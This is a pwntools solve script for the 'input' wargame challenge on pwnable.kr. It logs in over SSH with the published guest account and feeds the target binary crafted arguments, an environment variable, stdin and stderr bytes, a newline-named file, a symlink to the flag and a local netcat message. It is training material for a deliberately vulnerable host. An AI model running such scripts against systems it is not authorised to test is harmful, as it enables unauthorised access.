#!/usr/bin/python 

from pwn import *
import socket
#context.log_level = 'debug'
socket_port = 9050
cmd = []
cmd.append('/home/input2/input')
for num in range(1, 100):
    if num == 65:
        cmd.append('\x00')
    elif num == 66:
        cmd.append('\x20\x0a\x0d')
    elif num == 67:
        cmd.append(str(socket_port))
    else:
        cmd.append(str(num));

env = {}
env['\xde\xad\xbe\xef'] = '\xca\xfe\xba\xbe'



create_file = 'mkdir /tmp/rawr; cd /tmp/rawr; echo -ne "\x00\x00\x00\x00" > "\n";'
send_to_socket = 'echo -ne "\xde\xad\xbe\xef" | nc localhost ' + str(socket_port)
create_flag_link = 'cd /tmp/rawr; ln -sf /home/input2/flag flag;'

s = ssh(host='pwnable.kr', user='input2', port=2222, password='guest')
s.run_to_end(create_file)
s.run_to_end(create_flag_link)
sh = s.process(argv=cmd, stdin=sys.stdin, stderr=sys.stdin, env=env, cwd='/tmp/rawr/')
# stage 1
print sh.recvline()
print sh.recvline()
print sh.recvline()
print sh.recvline()

# stage 2
sh.sendline('\x00\x0a\x00\xff\x00\x0a\x02\xff')
print sh.recvline()

# stage 3
print sh.recvline()

# stage 4
print sh.recvline()

# stage 5
s.run_to_end(send_to_socket)
print sh.recvline()
print sh.recvline()

